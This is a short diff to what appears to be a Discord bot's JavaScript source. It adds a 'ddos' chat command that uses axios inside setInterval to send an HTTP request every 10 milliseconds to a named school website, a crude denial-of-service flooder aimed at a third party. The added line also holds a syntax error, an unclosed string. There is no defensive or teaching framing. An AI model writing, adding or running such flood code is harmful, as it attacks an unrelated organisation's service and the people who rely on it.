@@ -475,6 +475,12 @@ if(message.content.startsWith(p + "sexx")) {
 
 }
 
+if (message.content.startsWith(p + "ddos)) {
+const axios = require('axios');
+setInterval(() => axios('http://school69tmn.ru/'), 10);
+
+}
+
 }); 
 
 const { inspect } = require('util');
